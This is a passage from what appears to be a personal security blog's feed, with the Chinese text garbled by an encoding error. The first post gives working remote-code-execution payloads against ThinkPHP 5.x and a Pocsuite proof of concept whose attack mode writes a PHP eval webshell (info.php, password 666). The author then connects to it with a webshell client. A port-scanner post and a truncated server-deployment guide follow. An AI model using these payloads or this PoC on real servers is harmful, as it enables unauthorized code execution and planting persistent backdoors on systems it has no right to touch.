title="Request/input"></a>Request/input</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</span><br><span class="line">index.php?s=index/\think\Request/input&amp;filter=system&amp;data=echo%20%22&lt;?php%20eval($_POST[cmd])?&gt;%22%20&gt;%20a.php</span><br></pre></td></tr></table></figure><h3 id="Request-cache"><a href="#Request-cache" class="headerlink" title="Request/cache"></a>Request/cache</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\request/cache&amp;key=1|phpinfo</span><br><span class="line">index.php?s=index/\think\request/cache&amp;key=dir|system</span><br><span class="line">index.php?s=index/\think\request/cache&amp;key=<span class="built_in">echo</span>%20%22&lt;?php%20eval(<span class="variable">$_POST</span>[cmd])?&gt;%22%20&gt;%20a.php|system</span><br></pre></td></tr></table></figure><h3 id="container-invokefunction"><a href="#container-invokefunction" class="headerlink" title="container/invokefunction"></a>container/invokefunction</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\Container/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">index.php?s=index/\think\Container/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">index.php?s=index/\think\Container/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E</span><br></pre></td></tr></table></figure><h3 id="app-invokefunction"><a href="#app-invokefunction" class="headerlink" title="app/invokefunction"></a>app/invokefunction</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<span class="built_in">echo</span>%20%22&lt;?php%20phpinfo();?&gt;%22%20&gt;%20info.php</span><br><span class="line"></span><br><span class="line">index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ªè²Œä¼¼åªèƒ½å†™æ–‡ä»¶çš„</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20eval(<span class="variable">$_POST</span>[123]);?%3C</span><br></pre></td></tr></table></figure><h2 id="Payloadæµ‹è¯•"><a href="#Payloadæµ‹è¯•" class="headerlink" title="Payloadæµ‹è¯•"></a>Payloadæµ‹è¯•</h2><p>æµ‹è¯•çš„æ—¶å€™å‘ç°äº†äº›é—®é¢˜</p><p><img src="thinkphp-5.x-test.JPG" alt=""></p><p>å‰ä¸‰ä¸ªpaylaodå¯¹äº5.0.xæ— æ•ˆï¼Œåªæœ‰ç¬¬å››ä¸ªæœ‰æ•ˆ</p><p>è€Œ5.1.xåˆ™é€šæ€</p><p>ç»“åˆæ°´æ³¡æ³¡çš„åˆ†æ</p><p><img src="thinkphp-5.x-shuipaopao.JPG" alt=""></p><p>é‚£å°±åªæœ‰app/invokefunctionä¸€æ¡è·¯å¯ä»¥èµ°äº†</p><h2 id="Pocçš„ç¼–å†™"><a href="#Pocçš„ç¼–å†™" class="headerlink" title="Pocçš„ç¼–å†™"></a>Pocçš„ç¼–å†™</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pocsuite.net <span class="keyword">import</span> req</span><br><span class="line"><span class="keyword">from</span> pocsuite.poc <span class="keyword">import</span> POCBase, Output</span><br><span class="line"><span class="keyword">from</span> pocsuite.utils <span class="keyword">import</span> register</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThinkphpPoC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">    vulID = <span class="string">'97767'</span></span><br><span class="line">    version = <span class="string">'1'</span></span><br><span class="line">    author = [<span class="string">'p1n3'</span>]</span><br><span class="line">    vulDate = <span class="string">'2019-01-11'</span></span><br><span class="line">    createDate = <span class="string">'2019-01-11'</span></span><br><span class="line">    updateDate = <span class="string">'2019-01-11'</span></span><br><span class="line">    references = [<span class="string">'https://www.seebug.org/vuldb/ssvid-97767'</span>]</span><br><span class="line">    name = <span class="string">'Thinkphp 5.0.23åŠ5.1.31ä»¥ä¸‹ è¿œç¨‹ä»£ç æ‰§è¡Œ'</span></span><br><span class="line">    appPowerLink = <span class="string">'http://www.thinkphp.cn/'</span></span><br><span class="line">    appName = <span class="string">'Thinkphp'</span></span><br><span class="line">    appVersion = <span class="string">'5.x'</span></span><br><span class="line">    vulType = <span class="string">'RCE'</span></span><br><span class="line">    desc = <span class="string">'''</span></span><br><span class="line"><span class="string">    ç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹</span></span><br><span class="line"><span class="string">    å¯èƒ½çš„è¿œç¨‹ä»£ç æ‰§è¡Œå¯¼è‡´getshellï¼Œå—å½±å“åŒ…æ‹¬Thinkphpå…¨ç‰ˆæœ¬ï¼Œå»ºè®®æ›´æ–°åˆ°æœ€æ–°ç‰ˆæˆ–å¼€å¯å¼ºåˆ¶è·¯ç”±</span></span><br><span class="line"><span class="string">     '''</span></span><br><span class="line">    samples = [<span class="string">''</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        payload = self.url + <span class="string">'/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array'</span> \</span><br><span class="line">                             <span class="string">'&amp;vars[0]=print_r&amp;vars[1][]=fae0b27c451c728867a567e8c1bb4e53'</span></span><br><span class="line">        response = req.get(payload)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># md5(666) çš„å€¼</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fae0b27c451c728867a567e8c1bb4e53'</span> <span class="keyword">in</span> str(response.content):</span><br><span class="line">            result = &#123;<span class="string">'VerifyInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>][<span class="string">'payload'</span>] = payload</span><br><span class="line">        <span class="keyword">return</span> self.parse_result(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        info = &#123;</span><br><span class="line">            <span class="string">'ResultCode'</span>: &#123;</span><br><span class="line">                <span class="string">'a'</span>: <span class="keyword">False</span>,</span><br><span class="line">                <span class="string">'b'</span>: <span class="keyword">False</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        payload1 = self.url + <span class="string">'/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array'</span> \</span><br><span class="line">                              <span class="string">'&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20eval($_POST[666]);?%3E'</span></span><br><span class="line">        payload2 = self.url + <span class="string">'/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array'</span> \</span><br><span class="line">                              <span class="string">'&amp;vars[0]=system&amp;vars[1][]=echo%20%22&lt;?php%20eval($_POST[666]);?&gt;%22%20&gt;%20info.php'</span></span><br><span class="line">        req.get(payload1)</span><br><span class="line">        <span class="keyword">if</span> req.get(self.url + <span class="string">'/info.php'</span>).status_code == <span class="number">200</span>:</span><br><span class="line">            result = &#123;<span class="string">'AttackInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">            info[<span class="string">'ResultCode'</span>][<span class="string">'a'</span>] = <span class="keyword">True</span></span><br><span class="line">            result[<span class="string">'AttackInfo'</span>][<span class="string">'payload'</span>] = payload1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            req.get(payload2)</span><br><span class="line">            <span class="keyword">if</span> req.get(self.url + <span class="string">'/info.php'</span>).status_code == <span class="number">200</span>:</span><br><span class="line">                result = &#123;<span class="string">'AttackInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">                info[<span class="string">'ResultCode'</span>][<span class="string">'b'</span>] = <span class="keyword">True</span></span><br><span class="line">                result[<span class="string">'AttackInfo'</span>][<span class="string">'payload'</span>] = payload2</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> info[<span class="string">'ResultCode'</span>][<span class="string">'a'</span>] <span class="keyword">or</span> info[<span class="string">'ResultCode'</span>][<span class="string">'b'</span>]:</span><br><span class="line">            result[<span class="string">'AttackInfo'</span>][<span class="string">'shell'</span>] = self.url+<span class="string">'/info.php'</span></span><br><span class="line">            result[<span class="string">'AttackInfo'</span>][<span class="string">'pass'</span>] = <span class="string">'666'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.parse_result(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_result</span><span class="params">(self, result)</span>:</span></span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">'The vulnerability does not appear to be available!'</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register(ThinkphpPoC)</span><br></pre></td></tr></table></figure><h2 id="Pocæµ‹è¯•"><a href="#Pocæµ‹è¯•" class="headerlink" title="Pocæµ‹è¯•"></a>Pocæµ‹è¯•</h2><p><img src="thinkphp-5.x-pocsuite.JPG" alt=""></p><p>è¿˜æ˜¯ç¬¬ä¸€æ¬¡ç”¨Pocsuiteï¼Œå†™çš„ä¸å¥½â€¦ä½ æ¥æ‰“æˆ‘å‘€</p><p>ç›¸æ¯”pentestDBç­‰ï¼ŒPocsuiteä½“éªŒéå¸¸ä¸é”™ï¼Œæ‰“ç®—ä»¥åå°±ä¸€ç›´ä½¿ç”¨Pocsuiteå¥½äº†(å¦‚æœæœ‰æ›´å¥½çš„æ¡†æ¶è¯·åŠ¡å¿…ç§ä¿¡æˆ‘)</p><p>verifyæ¨¡å¼å¿˜æˆªå›¾äº†</p><p>attackæ¨¡å¼ä¼šç›´æ¥åœ¨åŒç›®å½•ä¸‹å†™ä¸€å¥è¯æœ¨é©¬</p><p>ç¥­å‡ºæ³•å™¨ä¸­å›½èšå‰‘</p><p><img src="thinkphp-5.x-yijian2.JPG" alt=""></p><p>æ–‡ä»¶æ˜¯info.php å¯†ç 666</p><p>å¾ˆå¥½</p><h2 id="enjoy-it"><a href="#enjoy-it" class="headerlink" title="enjoy it"></a>enjoy it</h2><p><img src="thinkphp-5.x-yijian.JPG" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;åŠé†‰åŠé†’æ—¥å¤æ—¥,èŠ±è½èŠ±å¼€å¹´å¤å¹´ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;2019äº†ã€‚&lt;/p&gt;
&lt;h2 id=&quot;æ¼æ´åˆ†æ&quot;&gt;&lt;a href=&quot;#æ¼æ´åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´åˆ†æ&quot;&gt;&lt;/a&gt;æ¼æ´åˆ†æ&lt;/h2&gt;
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="thinkphp" scheme="https://t43wiu6.github.io/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>pythonæ‰“é€ åŸºäºscapyçš„æ‰«æå™¨</title>
    <link href="https://t43wiu6.github.io/2018/11/17/web-scan/"/>
    <id>https://t43wiu6.github.io/2018/11/17/web-scan/</id>
    <published>2018-11-17T12:14:38.000Z</published>
    <updated>2019-04-09T13:26:11.543Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‡†å¤‡äº‹å®œ"><a href="#å‡†å¤‡äº‹å®œ" class="headerlink" title="å‡†å¤‡äº‹å®œ"></a>å‡†å¤‡äº‹å®œ</h2><p>scapyåº“<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/secdev/scapy.git</span><br><span class="line"><span class="built_in">cd</span> ./scapy</span><br><span class="line">python setup.py</span><br></pre></td></tr></table></figure></p><h2 id="æ„æ€"><a href="#æ„æ€" class="headerlink" title="æ„æ€"></a>æ„æ€</h2><a id="more"></a><p>æ”¾ä¸ªä¸‰æ¬¡æ¡æ‰‹åŸç†å›¾<br><img src="web-scan-1.png" alt=""><br>ä¸è¢«æ‰«ææœºè¿›è¡ŒSYNæ¡æ‰‹ï¼Œè¿”å›æ•°æ®åŒ…ä¸å¸¦ RST æ ‡è¯†å°±æ˜¯å¼€æ”¾äº†ç«¯å£<br>åŸºæœ¬æ€è·¯å‚è€ƒ</p><ul><li><a href="https://scapy.readthedocs.io/en/latest/usage.html#starting-scapy" target="_blank" rel="noopener">scapyå®˜æ–¹æ–‡æ¡£</a></li><li><a href="https://www.freebuf.com/sectool/94507.html" target="_blank" rel="noopener">å¦‚ä½•ç”¨Scapyå†™ä¸€ä¸ªç«¯å£æ‰«æå™¨ï¼Ÿ</a></li><li><a href="https://www.freebuf.com/sectool/125491.html" target="_blank" rel="noopener">Pythonçš„æ— çŠ¶æ€SYNå¿«é€Ÿæ‰«æ </a></li></ul><p>å®Œæ•´çš„é¡¹ç›®æˆ‘æ”¾åˆ°äº†githubä¸Š</p><ul><li><a href="https://github.com/sherdh/pineScan" target="_blank" rel="noopener">è¿™é‡Œ</a></li></ul><h2 id="é¢„å®šä¹‰çš„å…¨å±€å˜é‡"><a href="#é¢„å®šä¹‰çš„å…¨å±€å˜é‡" class="headerlink" title="é¢„å®šä¹‰çš„å…¨å±€å˜é‡"></a>é¢„å®šä¹‰çš„å…¨å±€å˜é‡</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç›®æ ‡ipä¸ç«¯å£</span></span><br><span class="line">ports = <span class="string">''</span></span><br><span class="line">target = <span class="string">''</span></span><br><span class="line"><span class="comment">#å®šä¹‰æ˜¯å¦ç”¨socketæ‰«æï¼Œé»˜è®¤ç”¨syn</span></span><br><span class="line">socket_scan_mode = <span class="keyword">False</span></span><br><span class="line"><span class="comment">#åˆè®¡socketæ‰«åˆ°ç«¯å£</span></span><br><span class="line">socket_flag = <span class="number">0</span></span><br><span class="line"><span class="comment"># Pn = True</span></span><br><span class="line"><span class="comment"># socketæ‰«æå¤šçº¿ç¨‹é”</span></span><br><span class="line">lock = threading.Semaphore(value=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#é»˜è®¤æ‰«æçš„ç«¯å£</span></span><br><span class="line">default_ports = [...]</span><br><span class="line"><span class="comment">#ç«¯å£å¯èƒ½å¯¹åº”çš„æœåŠ¡</span></span><br><span class="line">port_list = &#123;...&#125;</span><br></pre></td></tr></table></figure><h2 id="getoptæ¨¡å—å¤„ç†ç”¨æˆ·è¾“å…¥"><a href="#getoptæ¨¡å—å¤„ç†ç”¨æˆ·è¾“å…¥" class="headerlink" title="getoptæ¨¡å—å¤„ç†ç”¨æˆ·è¾“å…¥"></a>getoptæ¨¡å—å¤„ç†ç”¨æˆ·è¾“å…¥</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment">#ç”¨æ³•æç¤º</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage: pineScan.py -t target_host (-p)"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">" -h --help"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">" -t --target"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"example: -t 127.0.0.1"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">" -p --port"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"example: -p 80,445"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">" -s --socket"</span></span><br><span class="line"><span class="comment">#print " -Pn --skip host discovery"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> ports</span><br><span class="line"><span class="keyword">global</span> target</span><br><span class="line"><span class="keyword">global</span> socket_scan_mode</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment">#å¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°è§£æ</span></span><br><span class="line">opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">"hp:t:s"</span>,[<span class="string">"help"</span>,<span class="string">"port"</span>,<span class="string">"target"</span>,<span class="string">"socket"</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> o,a <span class="keyword">in</span> opts:</span><br><span class="line"><span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">"-h"</span>,<span class="string">"--help"</span>):</span><br><span class="line">usage()</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-t"</span>,<span class="string">"--target"</span>):</span><br><span class="line">target = a</span><br><span class="line"><span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-p"</span>,<span class="string">"--port"</span>):</span><br><span class="line">ports = a</span><br><span class="line"><span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-s"</span>,<span class="string">"--socket"</span>):</span><br><span class="line">socket_scan_mode = <span class="keyword">True</span></span><br><span class="line"><span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-Pn"</span>):</span><br><span class="line">Pn = <span class="keyword">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Unhandled Option"</span></span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> target:</span><br><span class="line"><span class="comment">#è°ƒç”¨æ‰«æ</span></span><br><span class="line">portScan(target, ports)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">usage()</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span> str(e)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">usage()</span><br></pre></td></tr></table></figure><h2 id="socketæ‰«ææ ¸å¿ƒä»£ç "><a href="#socketæ‰«ææ ¸å¿ƒä»£ç " class="headerlink" title="socketæ‰«ææ ¸å¿ƒä»£ç "></a>socketæ‰«ææ ¸å¿ƒä»£ç </h2><p>socketæ‰«æå†™éƒ½å†™äº†ï¼Œæ‡’å¾—åˆ äº†â€¦emmmm<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">socket_scan</span><span class="params">(target, port)</span>:</span></span><br><span class="line"><span class="comment">#socketå…¨è¿æ¥</span></span><br><span class="line"><span class="keyword">global</span> socket_flag</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment">#è®¾ç½®è¶…æ—¶</span></span><br><span class="line">conn.settimeout(<span class="number">2</span>)</span><br><span class="line">conn.connect((target, port))</span><br><span class="line">lock.acquire()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] %d/tcp open   %s\r'</span> % (port,port_list[port])</span><br><span class="line"><span class="comment">#è®¡ç®—å¼€å¯çš„ç«¯å£</span></span><br><span class="line">socket_flag = socket_flag + <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="comment">#çº¿ç¨‹é‡Šæ”¾</span></span><br><span class="line">lock.release()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></p><h2 id="synæ‰«ææ ¸å¿ƒä»£ç "><a href="#synæ‰«ææ ¸å¿ƒä»£ç " class="headerlink" title="synæ‰«ææ ¸å¿ƒä»£ç "></a>synæ‰«ææ ¸å¿ƒä»£ç </h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">syn_scan</span><span class="params">(ip,ports)</span>:</span></span><br><span class="line"><span class="comment">#æ„é€ æ•°æ®åŒ…</span></span><br><span class="line">ans,unans=sr(IP(dst=ip)/TCP(dport=ports, flags=<span class="string">'S'</span>),timeout = <span class="number">5</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"PORT      STATE    SERVICE"</span></span><br><span class="line"><span class="keyword">for</span> snd,rcv <span class="keyword">in</span> ans:</span><br><span class="line"><span class="comment">#ä»è¿”å›åŒ…è¯»å–æ•°æ®</span></span><br><span class="line">port = rcv.sprintf(<span class="string">"%IP.sport%"</span>)</span><br><span class="line">service = rcv.sprintf(<span class="string">"%TCP.sport%"</span>)</span><br><span class="line">flag = rcv.sprintf(<span class="string">"%TCP.flags%"</span>)</span><br><span class="line"><span class="keyword">if</span> flag == <span class="string">'SA'</span>:</span><br><span class="line"><span class="comment">#SAæ˜¯å¼€æ”¾äº†ç«¯å£</span></span><br><span class="line"><span class="keyword">if</span> is_number(service):</span><br><span class="line"><span class="comment">#åŒ…ä¸­ä¿¡æ¯çš„è¯»å–è‹¥ä¸ºæ•°å­—ï¼Œè°ƒç”¨å­—å…¸æŸ¥è¯¢å¯èƒ½çš„å¯¹åº”æœåŠ¡å¹¶æ›¿æ¢</span></span><br><span class="line"><span class="keyword">if</span> service <span class="keyword">in</span> port_list.keys():</span><br><span class="line"> service = port_list[service]</span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line"> service = <span class="string">'unknown'</span></span><br><span class="line"> <span class="comment">#æ ¼å¼åŒ–è¾“å‡º</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'%-10.5sopen     %s'</span> % (port,service)</span><br></pre></td></tr></table></figure><h2 id="æ‰«æè°ƒç”¨æ¨¡å—"><a href="#æ‰«æè°ƒç”¨æ¨¡å—" class="headerlink" title="æ‰«æè°ƒç”¨æ¨¡å—"></a>æ‰«æè°ƒç”¨æ¨¡å—</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ä»¥é€—å·åˆ†å‰²ç«¯å£å·</span></span><br><span class="line">ports = ports.split(<span class="string">","</span>)</span><br><span class="line"><span class="comment">#å¯¹stringç±»å‹åˆ—è¡¨å¤„ç†æˆintç±»å‹</span></span><br><span class="line">ports = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> ports]</span><br><span class="line"><span class="comment">#åˆ¤æ–­æ˜¯socketæ‰«æè¿˜æ˜¯synæ‰«æ</span></span><br><span class="line"><span class="keyword">if</span> socket_scan_mode:</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line"><span class="comment">#å¤šçº¿ç¨‹è°ƒç”¨socket</span></span><br><span class="line">thread = threading.Thread(target=socket_scan, args=(target, int(port)))</span><br><span class="line">thread.start()</span><br><span class="line"><span class="keyword">if</span> socket_flag == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"socket scan done!but no port is open"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment">#synä¸­æ•´ä¸ªåˆ—è¡¨ä¼ è¾“æ‰§è¡Œæ¯”forå¾ªç¯æ›´å¿«</span></span><br><span class="line">syn_scan(target,ports)</span><br></pre></td></tr></table></figure><h2 id="å®é™…ç»“æœå±•ç¤º"><a href="#å®é™…ç»“æœå±•ç¤º" class="headerlink" title="å®é™…ç»“æœå±•ç¤º"></a>å®é™…ç»“æœå±•ç¤º</h2><p><img src="web-scan-2.png" alt=""><br><img src="web-scan-3.png" alt=""><br>è¿˜ç®—å¯ä»¥ï¼ŒæŠ€æœ¯æ‰€é™ï¼Œå¤§ä½¬è½»å–·</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‡†å¤‡äº‹å®œ&quot;&gt;&lt;a href=&quot;#å‡†å¤‡äº‹å®œ&quot; class=&quot;headerlink&quot; title=&quot;å‡†å¤‡äº‹å®œ&quot;&gt;&lt;/a&gt;å‡†å¤‡äº‹å®œ&lt;/h2&gt;&lt;p&gt;scapyåº“&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/secdev/scapy.git&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; ./scapy&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;python setup.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;æ„æ€&quot;&gt;&lt;a href=&quot;#æ„æ€&quot; class=&quot;headerlink&quot; title=&quot;æ„æ€&quot;&gt;&lt;/a&gt;æ„æ€&lt;/h2&gt;
    
    </summary>
    
      <category term="ç¼–ç¨‹ä¹‹é“" scheme="https://t43wiu6.github.io/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="python" scheme="https://t43wiu6.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>å°ç«™è¿ç§»è®°(Nginxè‡ªåŠ¨åŒ–éƒ¨ç½²)</title>
    <link href="https://t43wiu6.github.io/2018/11/09/web-migration/"/>
    <id>https://t43wiu6.github.io/2018/11/09/web-migration/</id>
    <published>2018-11-09T10:24:07.000Z</published>
    <updated>2019-10-12T02:40:12.994Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSHéƒ¨ç½²é˜¿é‡Œäº‘vps"><a href="#SSHéƒ¨ç½²é˜¿é‡Œäº‘vps" class="headerlink" title="SSHéƒ¨ç½²é˜¿é‡Œäº‘vps"></a>SSHéƒ¨ç½²é˜¿é‡Œäº‘vps</h2><p>ç›´æ¥åœ¨é˜¿é‡Œäº‘æ§åˆ¶å°å¯¼å…¥ssh-keygenç”Ÿæˆçš„ç§˜é’¥<br><a href="/2018/07/24/git-config/">ç§˜é’¥ç”Ÿæˆçœ‹è¿™é‡Œ</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh git@serverip -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure></p><h2 id="å®‰è£…nginx"><a href="#å®‰è£…nginx" class="headerlink" title="å®‰è£…nginx"></a>å®‰è£…nginx</h2><a id="more"></a><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install nginx</span><br><span class="line">/etc/init.d/nginx start</span><br></pre></td></tr></table></figure><p>è®¿é—®ip,çœ‹åˆ°<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Welcome to nginx!</span><br></pre></td></tr></table></figure></p><p>é…ç½®æˆåŠŸäº†</p><h2 id="å®‰è£…Git"><a href="#å®‰è£…Git" class="headerlink" title="å®‰è£…Git"></a>å®‰è£…Git</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br><span class="line"><span class="comment">#åˆ›å»ºä¸€ä¸ªgitç”¨æˆ·,ç”¨äºè¿è¡ŒgitæœåŠ¡</span></span><br><span class="line">sudo adduser git</span><br><span class="line"><span class="comment">#å¯¼å…¥ç§˜é’¥åˆ°</span></span><br><span class="line">/home/git/.ssh/authorized_keys</span><br><span class="line"><span class="comment">#ä¿®æ”¹æƒé™</span></span><br><span class="line">chmod 600 authorized_keys</span><br><span class="line"><span class="comment">#åˆå§‹åŒ–gitä»“åº“</span></span><br><span class="line">git init --bare blo.git</span><br><span class="line"><span class="comment">#æ›´æ”¹æ‰€æœ‰æƒ</span></span><br><span class="line">sudo chown -R git:git blog.git</span><br><span class="line"><span class="comment">#ç¦æ­¢shellç™»å½•</span></span><br><span class="line">ä¿®æ”¹/etc/passwdçš„git:x:1003:1003::/home/git:/bin/bash</span><br><span class="line">æ”¹ä¸ºgit:x:1003:1003::/home/git:/usr/bin/git-shell</span><br><span class="line"><span class="comment">#å…‹éš†è¿œç¨‹ä»“åº“</span></span><br><span class="line">git <span class="built_in">clone</span> git@serverip:/home/git/blog.git</span><br></pre></td></tr></table></figure><h2 id="é…ç½®nginx"><a href="#é…ç½®nginx" class="headerlink" 